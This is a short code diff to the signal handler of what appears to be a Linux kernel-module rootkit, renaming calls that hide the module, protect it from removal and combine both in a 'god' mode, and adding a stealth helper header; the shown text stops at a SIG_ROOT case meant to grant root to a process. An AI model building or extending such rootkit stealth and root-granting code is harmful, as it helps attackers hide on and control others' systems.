@@ -1,20 +1,20 @@
 #include "include/comms.h"
+#include "include/stealth_helper.h"
 
 /* Executes appropriate functions based on given signal. pid is meant to be used
  * with signal SIG_ROOT */
 void sig_handle(const uint32_t sig, pid_t pid) {
   switch (sig) {
   case SIG_HIDE:
-    handle_lkm_hide();
+    h_lkm_hide();
     break;
 
   case SIG_PROTECT:
-    handle_lkm_protect();
+    h_lkm_protect();
     break;
 
   case SIG_GOD:
-    handle_lkm_hide();
-    handle_lkm_protect();
+    h_lkm_hide_and_protect();
     break;
 
   case SIG_ROOT:
